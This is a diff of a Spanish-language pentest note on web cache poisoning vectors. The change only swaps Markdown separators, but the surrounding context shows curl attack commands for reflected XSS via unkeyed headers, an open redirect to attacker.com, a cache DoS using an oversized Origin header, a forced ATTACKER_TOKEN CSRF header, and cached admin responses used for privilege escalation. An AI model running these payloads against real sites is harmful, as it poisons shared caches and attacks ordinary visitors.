@@ -19,7 +19,7 @@ linked:
 ---
 # Web Cache Poisoning - Vectores de Poisoning
 
-***
+---
 
 ## Reflected XSS via Unkeyed Header
 
@@ -57,7 +57,7 @@ curl -s "$URL2" | grep -i "<base href"
 # Victims fetching $URL2 reciben XSS por TTL completo
 ```
 
-___
+---
 
 ## Open Redirect via Host / X-Forwarded-Host
 
@@ -83,7 +83,7 @@ curl -s "$URL" -I | grep -i location
 # Location: https://attacker.com/...  ← persistente cached
 ```
 
-___
+---
 
 ## DoS via Cache Poisoning (404 / 500 Storm)
 
@@ -98,7 +98,7 @@ ___
 | `curl -H "Origin: $(python3 -c 'print(\"A\"*5000)')" "https://target/api/?cb=$RANDOM"` | Cache CORS error response | CORS broken cached. |
 ^wcp-vector-dos
 
-___
+---
 
 ## Cookie Injection
 
@@ -111,7 +111,7 @@ ___
 | `curl -H "X-CSRF-Token-Override: ATTACKER_TOKEN" "https://target/form?cb=$RANDOM"` | Cached CSRF token forced | CSRF token cached. |
 ^wcp-vector-cookie
 
-___
+---
 
 ## Internal Header Injection
 
@@ -126,4 +126,4 @@ ___
 | Post-poison: víctima común `curl https://target/admin?cb=$KEY` → recibe admin response | Mass privesc via cached admin context | Critical impact. |
 ^wcp-vector-internal
 
-***
+---
